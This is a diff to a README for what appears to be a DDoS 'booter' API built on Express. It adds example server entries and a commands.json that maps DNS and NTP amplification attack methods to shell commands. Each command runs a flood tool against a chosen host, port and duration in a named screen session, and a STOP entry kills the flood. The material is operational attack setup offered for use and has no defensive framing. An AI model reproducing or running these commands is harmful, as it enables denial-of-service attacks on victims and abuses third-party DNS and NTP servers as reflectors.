@@ -15,8 +15,33 @@ npm i express
 
 <h1>Setup:</h1>
 
-Update servers.json to your servers IP/Ports and names<br>
-Update commands.json to your methods names and commands<br>
+<h3>Update servers.json to your servers IP/Ports and names</h3><br>
+
+```json
+{
+    "alpha": {
+        "name": "alpha",
+        "ip": "1.1.1.1",
+        "port": 3000
+    },
+    "beta": {
+        "name": "beta",
+        "ip": "2.2.2.2",
+        "port": 3000
+    }
+}
+```
+
+<h3>Update commands.json to your methods names and commands</h3><br>
+
+```json
+{
+    "DNS": "screen -dmS attack_${attack_id} ./dns_amp ${host} ${port} dns.txt 1 250000 ${time}",
+    "NTP": "screen -dmS attack_${attack_id} ./ntp_amp ${host} ${port} ntp.txt 1 250000 ${time}",
+    "STOP": "screen -dm pkill -f ${host}"
+}
+```
+
 <h3>Update api.js:</h3><br>
 
 ```
